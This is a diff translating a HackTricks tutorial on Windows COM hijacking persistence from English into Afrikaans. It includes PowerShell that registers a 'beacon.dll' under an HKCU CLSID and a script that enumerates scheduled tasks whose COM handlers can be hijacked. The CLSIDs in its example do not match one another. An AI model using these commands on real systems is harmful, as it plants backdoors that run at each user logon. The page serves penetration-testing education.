@@ -2,59 +2,56 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-### Searching not existent COM components
+### Soek na nie-bestaande COM-komponente
 
-As the values of HKCU can be modified by the users **COM Hijacking** could be used as a **persistent mechanisms**. Using `procmon` it's easy to find searched COM registries that doesn't exist that an attacker could create to persist. Filters:
+Aangesien die waardes van HKCU deur die gebruikers gewysig kan word, kan **COM Hijacking** as 'n **volhardende meganisme** gebruik word. Deur `procmon` te gebruik, is dit maklik om gesoekte COM-registers te vind wat nie bestaan nie, wat 'n aanvaller kan skep om volharding te bewerkstellig. Filters:
 
-- **RegOpenKey** operations.
-- where the _Result_ is **NAME NOT FOUND**.
-- and the _Path_ ends with **InprocServer32**.
+- **RegOpenKey** operasies.
+- waar die _Result_ **NAAM NIE GEVIND** is.
+- en die _Path_ eindig met **InprocServer32**.
 
-Once you have decided which not existent COM to impersonate execute the following commands. _Be careful if you decide to impersonate a COM that is loaded every few seconds as that could be overkill._&#x20;
-
+Sodra jy besluit het watter nie-bestaande COM om te verpersoonlik, voer die volgende opdragte uit. _Wees versigtig as jy besluit om 'n COM te verpersoonlik wat elke paar sekondes gelaai word, aangesien dit oorbodig kan wees._
 ```bash
 New-Item -Path "HKCU:Software\Classes\CLSID" -Name "{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}"
 New-Item -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}" -Name "InprocServer32" -Value "C:\beacon.dll"
 New-ItemProperty -Path "HKCU:Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32" -Name "ThreadingModel" -Value "Both"
 ```
+### Hijackbare Taakbeheerders COM-komponente
 
-### Hijackable Task Scheduler COM components
+Windows Take gebruik Aangepaste Triggers om COM-objekte aan te roep en omdat hulle deur die Taakbeheerders uitgevoer word, is dit makliker om te voorspel wanneer hulle geaktiveer gaan word.
 
-Windows Tasks use Custom Triggers to call COM objects and because they're executed through the Task Scheduler, it's easier to predict when they're gonna be triggered.
-
-<pre class="language-powershell"><code class="lang-powershell"># Show COM CLSIDs
+<pre class="language-powershell"><code class="lang-powershell"># Wys COM CLSIDs
 $Tasks = Get-ScheduledTask
 
 foreach ($Task in $Tasks)
 {
-  if ($Task.Actions.ClassId -ne $null)
-  {
-    if ($Task.Triggers.Enabled -eq $true)
-    {
-      $usersSid = "S-1-5-32-545"
-      $usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
+if ($Task.Actions.ClassId -ne $null)
+{
+if ($Task.Triggers.Enabled -eq $true)
+{
+$usersSid = "S-1-5-32-545"
+$usersGroup = Get-LocalGroup | Where-Object { $_.SID -eq $usersSid }
 
-      if ($Task.Principal.GroupId -eq $usersGroup)
-      {
-        Write-Host "Task Name: " $Task.TaskName
-        Write-Host "Task Path: " $Task.TaskPath
-        Write-Host "CLSID: " $Task.Actions.ClassId
-        Write-Host
-      }
-    }
-  }
+if ($Task.Principal.GroupId -eq $usersGroup)
+{
+Write-Host "Taak Naam: " $Task.TaskName
+Write-Host "Taak Pad: " $Task.TaskPath
+Write-Host "CLSID: " $Task.Actions.ClassId
+Write-Host
+}
+}
+}
 }
 
-# Sample Output:
-<strong># Task Name:  Example
-</strong># Task Path:  \Microsoft\Windows\Example\
+# Voorbeeld Uitset:
+<strong># Taak Naam:  Voorbeeld
+</strong># Taak Pad:  \Microsoft\Windows\Voorbeeld\
 # CLSID:  {1936ED8A-BD93-3213-E325-F38D112938E1}
-# [more like the previous one...]</code></pre>
+# [meer soos die vorige een...]</code></pre>
 
-Checking the output you can select one that is going to be executed **every time a user logs in** for example.
+Deur die uitset te kontroleer, kan jy een kies wat **elke keer 'n gebruiker aanmeld** gaan uitgevoer word, byvoorbeeld.
 
-Now searching for the CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** and in HKLM and HKCU, you usually will find that the value doesn't exist in HKCU.
-
+Nou, deur te soek na die CLSID **{1936ED8A-BD93-3213-E325-F38D112938EF}** in **HKEY\_**_**CLASSES\_**_**ROOT\CLSID** en in HKLM en HKCU, sal jy gewoonlik vind dat die waarde nie in HKCU bestaan nie.
 ```bash
 # Exists in HKCR\CLSID\
 Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}"
@@ -62,7 +59,7 @@ Get-ChildItem -Path "Registry::HKCR\CLSID\{1936ED8A-BD93-3213-E325-F38D112938EF}
 Name           Property
 ----           --------
 InprocServer32 (default)      : C:\Windows\system32\some.dll
-               ThreadingModel : Both
+ThreadingModel : Both
 
 # Exists in HKLM
 Get-Item -Path "HKLM:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}" | ft -AutoSize
@@ -75,8 +72,6 @@ Name                                   Property
 PS C:\> Get-Item -Path "HKCU:Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}"
 Get-Item : Cannot find path 'HKCU:\Software\Classes\CLSID\{01575CFE-9A55-4003-A5E1-F38D1EBDCBE1}' because it does not exist.
 ```
-
-Then, you can just create the HKCU entry and everytime the user logs in, your backdoor will be fired.
+Dan kan jy net die HKCU-invoer skep en elke keer wanneer die gebruiker aanmeld, sal jou backdoor geaktiveer word.
 
 {{#include ../../banners/hacktricks-training.md}}
-
